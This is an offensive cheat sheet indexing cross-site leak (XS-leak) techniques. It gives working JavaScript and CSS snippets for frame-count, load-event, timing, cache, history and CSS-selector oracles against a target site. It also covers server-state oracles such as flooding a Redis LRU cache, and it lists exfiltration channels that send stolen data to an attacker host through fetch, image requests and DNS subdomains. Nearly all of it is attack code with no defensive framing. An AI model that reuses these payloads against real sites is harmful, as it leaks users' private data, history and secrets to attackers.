# Oracles index — every XS-leak channel, indexed by type

The complete oracle catalog — which channel for which surface.

---

## A. The classic client-side oracles — your JS runs

### frames.length — a count oracle

```js
var f=document.createElement('iframe');
f.src='https://t/search?q='+g;
f.onload=()=>exfil(g+'='+f.contentWindow.frames.length);
```
a per-result iframe count — a hit renders N, a miss renders 0.
bandwidth: log2(N) bits per load.

### onload/onerror — a hit/miss oracle

```js
var i=new Image();
i.onload=()=>exfil('H'); i.onerror=()=>exfil('M');
i.src='https://t/api/search?q='+g;
```
a 200 vs a 404 — the load event is the bit. works on <img>/<script>
/<link>/<iframe>/<video>/<audio>/<object>.
bandwidth: 1 bit per load.

### timing — a slow-vs-fast oracle

```js
var t0=performance.now();
fetch('https://t/api/search?q='+g,{mode:'no-cors'})
 .finally(()=>exfil(g+'='+(performance.now()-t0)));
```
a slow query vs a fast rejection — a threshold is the bit.
bandwidth: ~1 bit per load (noisy — average over N samples).

### cache-probe — a cached-vs-uncached oracle

```js
var t0=performance.now(); var i=new Image();
i.onload=()=>exfil(g+'='+(performance.now()-t0));
i.src='https://t/r/'+g+'?cb='+Math.random();
```
a cached resource loads faster — 'was it cached' = 'was it visited'.
bandwidth: 1 bit per load. partition: same-site only.

### :visited — a history oracle

```js
var a=document.createElement('a');
a.href='https://t/search?q='+g; document.body.appendChild(a);
// a :visited style differs — a render-side-channel read
```
a visited URL styles differently — a 404 never enters history.
bandwidth: 1 bit per load. partition: same-site / a render channel.

### window.open — a navigation oracle

```js
var w=window.open('https://t/x?q='+g);
setTimeout(()=>exfil('open='+(w&&!w.closed)),2000);
```
did the navigation happen — a redirect check.
bandwidth: 1 bit per load.

### scrollHeight — a content-size oracle

```js
var f=document.createElement('iframe');
f.src='https://t/search?q='+g;
f.onload=()=>exfil(g+'='+f.contentDocument.body.scrollHeight);
```
a content-length leak — the page's height differs with the result.
bandwidth: log2(N) bits per load.

### history.length — a navigation-count oracle

```js
exfil('history='+window.history.length);
```
'how many navigations happened' — a count oracle.
bandwidth: log2(N) bits per read.

### resource-timing — a load-duration oracle

```js
performance.getEntriesByName('https://t/r/'+g).forEach(e=>exfil(e.name+'='+e.duration));
```
a subresource's load duration — a 'was it loaded' + 'how long' read.
bandwidth: ~1 bit + a duration.

## B. The sealed declarative oracles — no JS, a CSS channel

### CSS-attribute-selector — a match oracle

```css
body[secret^="ab"]{--m:url('/leak/ab')}
#trig{background-image:var(--m,none)}
```
a reflected secret in an attribute — a match → a URL load.
bandwidth: thousands of parallel rules — a char-set or a whole secret.
requires: a secret in an ATTRIBUTE + a style-src/font-src/img-src hole.

### @font-face unicode-range — a char-set oracle

```css
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
#secret{font-family:x;display:block !important}
```
a font-src wildcard — one face per alphabet char — the requested
URLs ARE the character-set.
bandwidth: a whole char-set per load.
requires: a secret in TEXT + a font-src wildcard.

### CSS-selector + custom-property — a multi-select oracle

```css
body[secret^="ab"]{--m_ab:url('/leak/ab')}
body[secret$="ef"]{--m_ef:url('/leak/ef')}
body[secret*="abc"]{--m_abc:url('/leak/abc')}
#trig{background-image:var(--m_ab,none),var(--m_ef,none),var(--m_abc,none)}
```
prefix + suffix + substring in one stylesheet — thousands of rules.
bandwidth: thousands of parallel rules.

## C. The sealed server-state oracles — a mutation the GET caused

### LRU-eviction — a recency oracle

```text
a redis --maxmemory-policy allkeys-lru — a GET that touches a key
refreshes it — flood the store → the survivors are the bot's GETs.
```
bandwidth: thousands of bits — the survivor SET is the leak.
blast_radius: the flood evicts every other key — possibly the secret.

### counter++ — a next-value oracle

```text
a GET that increments a readable counter — 'the counter is N+1'.
```
bandwidth: a few bits — the next value is the leak.

### one-shot token — a consumed-or-not oracle

```text
a GETDEL/single-use nonce — 'did it survive' is one bit.
```
bandwidth: one bit — burns the check — spend it LAST.

### rate-limit bucket — a quota oracle

```text
a bucket with a remaining count — a consumed quota = 'the GET ran'.
```
bandwidth: a few bits — the remaining quota is the leak.

### 'last seen' timestamp — a recency oracle

```text
a timestamp a GET updates — 'the last-seen time is T'.
```
bandwidth: a recency read — a timestamp.

## D. The exfil channels — how the data reaches you

### a listener — the classic exfil

```js
fetch('https://a/?'+encodeURIComponent(d))
new Image().src='https://a/?'+encodeURIComponent(d)
```
a GET to your server — the classic exfil.

### a write-back — an airgapped exfil

```js
fetch('https://t/api/comment',{method:'POST',body:JSON.stringify({t:d})})
```
the data lands on the target — an airgapped case.

### a DOM-writeback — a screenshotting bot

```js
document.body.innerHTML='<div style="font-size:80px">'+d+'</div>'
```
a screenshot IS the exfil — no listener needed.

### a DNS exfil — a subdomain carrier

```js
new Image().src='https://'+btoa(d)+'.a.com/'
```
the data rides the DNS subdomain — an airgapped case.

### a postMessage — a broadcast carrier

```js
parent.postMessage(d,'*')
```
the data broadcast to any listener — a real read primitive.
